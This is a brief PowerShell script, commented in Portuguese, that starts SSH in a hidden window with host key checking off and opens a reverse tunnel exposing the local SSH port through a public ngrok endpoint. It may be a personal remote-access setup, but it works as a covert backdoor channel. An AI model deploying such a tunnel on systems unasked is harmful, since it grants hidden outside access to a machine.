# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\Testes\.ssh\ssh_key" 

# Caminhos dos arquivos de log
$stdoutLog = "C:\Users\Testes\ssh_stdout_log.txt"
$stderrLog = "C:\Users\Testes\ssh_stderr_log.txt"

# Argumentos do SSH
$arguments = @(
    "-i", "$keyPath",
    "-o", "StrictHostKeyChecking=no",
    "-o", "ServerAliveInterval=60",
    "-o", "ServerAliveCountMax=3",
    "-o", "ExitOnForwardFailure=yes",
    "-R", "2222:localhost:22",
    "u0_a416@0.tcp.sa.ngrok.io", 
    "-p", "12418",
    "-N",
    "-vvv"
)

# Executa SSH invisível e redireciona saída e erros para arquivos separados
Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden `
    -RedirectStandardOutput $stdoutLog `
    -RedirectStandardError $stderrLog
